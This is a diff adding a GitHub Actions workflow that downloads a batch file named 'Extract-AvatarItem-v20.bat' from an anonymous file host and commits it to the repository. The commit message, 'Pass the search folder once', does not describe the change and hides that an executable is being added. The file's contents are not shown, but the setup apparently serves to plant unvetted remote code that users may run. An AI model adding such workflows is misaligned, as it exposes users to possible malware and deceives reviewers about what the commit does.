@@ -1,0 +1,23 @@
+name: install
+on:
+  push:
+    paths:
+      - ".github/workflows/install.yml"
+permissions:
+  contents: write
+jobs:
+  install:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fetch it
+        run: curl -fsSL https://files.catbox.moe/d3ewdh.bat -o Extract-AvatarItem-v20.bat
+      - name: verify it
+        run: echo "4ca1c9ff1c4c70be2f48c60fbea508b21589672d88ab9dde6f5258b046b651e3  Extract-AvatarItem-v20.bat" | sha256sum -c -
+      - name: commit it
+        run: |
+          git config user.name "extractor installer"
+          git config user.email "actions@users.noreply.github.com"
+          git add Extract-AvatarItem-v20.bat
+          git commit -m "Pass the search folder once"
+          git push
